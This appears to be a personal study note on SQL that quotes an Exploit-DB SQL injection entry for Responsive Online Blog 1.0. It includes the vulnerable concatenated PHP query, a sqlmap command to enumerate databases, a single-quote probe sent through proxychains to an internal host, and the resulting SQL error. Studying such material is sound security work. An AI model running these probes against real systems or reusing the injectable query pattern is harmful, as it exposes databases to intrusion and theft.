# 🤖 SQL
Tags: #🤖
Related to: 
See also: 
Previous: [[PROGRAMMING]]

---

## Description

SQL is a domain-specific language used in programming and designed for managing data held in a relational database management system (RDBMS), or for stream processing in a relational data stream management system (RDSMS).

## Usage Examples

### SQL Injection (SQLi)

```
  Exploit: Responsive Online Blog 1.0 - 'id' SQL Injection
      URL: https://www.exploit-db.com/exploits/48615
     Path: /usr/share/exploitdb/exploits/php/webapps/48615.txt
File Type: Unicode text, UTF-8 text

# Exploit Title: Responsive Online Blog 1.0 - 'id' SQL Injection
# Date: 2020-06-23
# Exploit Author: Eren Şimşek
# Vendor Homepage: https://www.sourcecodester.com/php/14194/responsive-online-blog-website-using-phpmysql.html
# Software Link: https://www.sourcecodester.com/download-code?nid=14194&title=Responsive+Online+Blog+Website+using+PHP%2FMySQL
# Version: v1.0
# Tested on: Linux - Wamp Server

>Vulnerable File
   /category.php

>Vulnerable Code

   $id=$_REQUEST['id'];
   $query="SELECT * from blog_categories where id='".$id."'";
   Id parameter enters sql query without any changes

>Proof Of Concept
   sqlmap 'http://localhost/resblog/category.php?id=1' --dbs --batch
   OR
   http://TARGET/resblog/category.php?id=1' Single Quote will cause SQL error
```

	proxychains firefox http://172.16.1.12/blog/single.php?id=1%27	// ' == %27 in hex

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1
```

---
## References

- [[]]